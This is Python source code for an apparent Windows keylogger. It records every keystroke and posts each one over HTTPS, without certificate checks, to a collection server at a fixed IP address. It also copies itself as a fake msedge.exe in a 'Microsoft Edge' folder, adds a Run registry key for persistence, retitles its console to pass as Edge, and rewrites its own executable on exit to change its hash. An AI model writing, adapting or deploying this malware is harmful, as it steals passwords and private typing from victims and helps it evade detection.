from tkinter import Tk, Label
from pynput.keyboard import Listener
import requests
import random
import os
import sys
import subprocess
import winreg as reg
import ctypes
import atexit
import shutil

# Server URL with HTTPS
server_url = 'https://192.168.86.229:5000/log'

def send_data(key):
    try:
        # Send the keystroke data over HTTPS
        requests.post(server_url, data={'keystroke': str(key)}, verify=False)
    except Exception as e:
        print(f"Failed to send data: {e}")

def on_press(key):
    send_data(key)

def main():
    # Start the keylogger
    with Listener(on_press=on_press) as listener:
        listener.join()

def add_to_startup(exe_name, exe_path):
    # Add the executable to the registry to run at startup
    key = reg.HKEY_CURRENT_USER
    key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
    
    key_obj = reg.OpenKey(key, key_value, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(key_obj, exe_name, 0, reg.REG_SZ, exe_path)
    reg.CloseKey(key_obj)

def rename_process(new_name):
    # Change the process name to something inconspicuous
    ctypes.windll.kernel32.SetConsoleTitleW(new_name)

def move_to_edge_folder():
    # Use the LocalAppData directory and create a 'Microsoft Edge' folder
    localappdata_path = os.getenv('LOCALAPPDATA')
    edge_folder = os.path.join(localappdata_path, 'Microsoft Edge')
    exe_name = "msedge.exe"  # Mimic Microsoft Edge executable
    hidden_path = os.path.join(edge_folder, exe_name)

    # Create the Microsoft Edge directory if it doesn't exist
    if not os.path.exists(edge_folder):
        os.makedirs(edge_folder)

    # Move the executable to the Microsoft Edge folder
    if not os.path.exists(hidden_path):
        shutil.copyfile(sys.executable, hidden_path)

    # Return the path where the file was copied
    return hidden_path

def show_hacked_message():
    # Create a Tkinter window
    root = Tk()
    root.title("Security Alert")
    root.geometry("300x150")
    
    # Display a label with the hacked message
    label = Label(root, text="You have been hacked!", font=("Arial", 14))
    label.pack(pady=20)

    # Run the Tkinter event loop
    root.mainloop()

def create_and_run_batch_script(exe_path):
    # Batch script content
    batch_content = f"""@echo off
timeout /t 5 /nobreak
copy /b "{exe_path}" "{exe_path}_temp.exe"
echo RandomData>>"{exe_path}_temp.exe"
move /y "{exe_path}_temp.exe" "{exe_path}"
"""

    # Define the batch script path
    batch_path = os.path.join(os.getenv('TEMP'), 'mutate.bat')

    # Write the batch content to a file
    with open(batch_path, 'w') as batch_file:
        batch_file.write(batch_content)

    # Run the batch script
    subprocess.Popen(["cmd.exe", "/c", batch_path])

def exit_handler():
    # Call the function to create and run the batch script
    exe_path = sys.executable
    create_and_run_batch_script(exe_path)

if __name__ == "__main__":
    exe_name = "Microsoft Edge"

    # Show the hacked message at startup
    show_hacked_message()

    # Move the executable to the Microsoft Edge folder in LocalAppData
    hidden_exe_path = move_to_edge_folder()

    # Rename the process to something inconspicuous
    rename_process(exe_name)

    # Add the hidden executable to startup using the fixed path in the Microsoft Edge folder
    add_to_startup(exe_name, hidden_exe_path)

    # Register the exit handler to mutate the executable on exit
    atexit.register(exit_handler)

    # Start the keylogger
    main()
